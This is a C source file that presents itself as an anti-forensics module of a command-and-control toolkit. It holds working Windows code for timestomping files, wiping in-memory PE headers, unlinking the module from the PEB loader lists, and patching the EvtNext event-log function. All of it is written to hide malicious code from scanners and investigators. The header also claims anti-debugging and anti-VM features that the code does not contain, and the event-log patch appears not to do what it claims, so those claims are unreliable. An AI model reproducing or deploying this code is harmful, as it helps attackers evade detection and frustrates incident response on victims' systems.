/**
 * Anti-Analysis and Anti-Forensics Module
 * =======================================
 * 
 * Features:
 * - Timestomping: Modify file creation/modification times (MFT)
 * - Event Log Tampering: Suppress event logging via API patching
 * - Memory Forensics Evasion: PE header wiping and PEB unlinking
 * - Anti-Debugging and Anti-VM checks
 * - Forensic trace erasure
 * 
 * MITRE: T1070.006 (Indicator Removal on Host: Timestomp)
 * Author: Fitnah C2 Team
 * Version: 2.0.0
 */

#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <stdint.h>

typedef struct _LDR_DATA_TABLE_ENTRY_COMPLET {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    // ... rest of the structure is not needed for unlinking
} LDR_DATA_TABLE_ENTRY_COMPLET, *PLDR_DATA_TABLE_ENTRY_COMPLET;

/**
 * Timestomp - Copy timestamps from a source file to a target file
 */
BOOL Timestomp(LPCSTR szSourcePath, LPCSTR szTargetPath) {
    HANDLE hSource = CreateFileA(szSourcePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hSource == INVALID_HANDLE_VALUE) return FALSE;

    FILETIME ftCreate, ftAccess, ftWrite;
    if (!GetFileTime(hSource, &ftCreate, &ftAccess, &ftWrite)) {
        CloseHandle(hSource);
        return FALSE;
    }
    CloseHandle(hSource);

    HANDLE hTarget = CreateFileA(szTargetPath, GENERIC_WRITE | FILE_WRITE_ATTRIBUTES, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hTarget == INVALID_HANDLE_VALUE) return FALSE;

    if (!SetFileTime(hTarget, &ftCreate, &ftAccess, &ftWrite)) {
        CloseHandle(hTarget);
        return FALSE;
    }
    CloseHandle(hTarget);

    return TRUE;
}

/**
 * ErasePeHeaders - Wipe PE headers from memory to frustrate forensics
 */
VOID ErasePeHeaders() {
    PVOID pBase = GetModuleHandle(NULL);
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pBase;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((LPBYTE)pBase + pDos->e_lfanew);
    
    DWORD oldProtect;
    SIZE_T headerSize = pNt->OptionalHeader.SizeOfHeaders;
    
    if (VirtualProtect(pBase, headerSize, PAGE_READWRITE, &oldProtect)) {
        SecureZeroMemory(pBase, headerSize);
        VirtualProtect(pBase, headerSize, oldProtect, &oldProtect);
    }
}

/**
 * UnlinkFromPeb - Remove current module from PEB Ldr lists to hide from scanners
 */
VOID UnlinkFromPeb() {
#ifdef _WIN64
    PPEB pPeb = (PPEB)__readgsqword(0x60);
#else
    PPEB pPeb = (PPEB)__readfsdword(0x30);
#endif

    PLDR_DATA_TABLE_ENTRY_COMPLET pEntry = (PLDR_DATA_TABLE_ENTRY_COMPLET)pPeb->Ldr->InLoadOrderModuleList.Flink;
    PVOID pBase = GetModuleHandle(NULL);

    while (pEntry->DllBase != NULL) {
        if (pEntry->DllBase == pBase) {
            // Unlink from InLoadOrderLinks
            pEntry->InLoadOrderLinks.Flink->Blink = pEntry->InLoadOrderLinks.Blink;
            pEntry->InLoadOrderLinks.Blink->Flink = pEntry->InLoadOrderLinks.Flink;

            // Unlink from InMemoryOrderLinks
            pEntry->InMemoryOrderLinks.Flink->Blink = pEntry->InMemoryOrderLinks.Blink;
            pEntry->InMemoryOrderLinks.Blink->Flink = pEntry->InMemoryOrderLinks.Flink;

            // Unlink from InInitializationOrderLinks
            pEntry->InInitializationOrderLinks.Flink->Blink = pEntry->InInitializationOrderLinks.Blink;
            pEntry->InInitializationOrderLinks.Blink->Flink = pEntry->InInitializationOrderLinks.Flink;

            break;
        }
        pEntry = (PLDR_DATA_TABLE_ENTRY_COMPLET)pEntry->InLoadOrderLinks.Flink;
    }
}

/**
 * PatchEventLog - Patch wevtapi.dll to disable logging
 */
VOID PatchEventLog() {
    HMODULE hEvt = LoadLibraryA("wevtapi.dll");
    if (!hEvt) return;

    PVOID pEvtNext = (PVOID)GetProcAddress(hEvt, "EvtNext");
    if (!pEvtNext) return;

    // x64: xor eax, eax; ret
    BYTE patch[] = { 0x31, 0xC0, 0xC3 }; 
    
    DWORD oldProtect;
    if (VirtualProtect(pEvtNext, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect)) {
        memcpy(pEvtNext, patch, sizeof(patch));
        VirtualProtect(pEvtNext, sizeof(patch), oldProtect, &oldProtect);
    }
}
